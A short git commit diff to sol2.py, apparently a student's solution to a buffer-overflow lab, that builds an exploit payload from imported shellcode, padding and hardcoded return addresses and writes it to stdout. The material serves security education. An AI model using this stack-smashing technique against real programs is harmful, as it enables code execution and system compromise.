8387f39012a8059aefd4c9f39982bfa97d38816a
priyald <priyank.s.deep@gmail.com>
2024-04-03 07:50:05 +0000

    WOWWW

--- sol2.py
+++ sol2.py
@@ -4,5 +4,16 @@ import sys
 
 from shellcode import shellcode
 
-run = b'\x00'*4 #+b'\x00\x00\x00\x00\x00\x40\x1c\xda'
-sys.stdout.buffer.write(run+shellcode)
+# Calculate the offset
+
+offset = b'\x00'*58
+offset+= b'\xa0\x86\xf6\xff\xff\x7f\x00\x00'
+offset+= b'\xa0\x86\xf6\xff\xff\x7f\x00\x00'
+#\x7f\xff\xff\xf6\x86\xa0
+#\xa0\x86\xf6\xff\xff\x7f
+
+#0x7ffffff686a0
+#0x7ffffff686d6
+
+# Write the payload to stdout buffer
+sys.stdout.buffer.write(shellcode+offset)
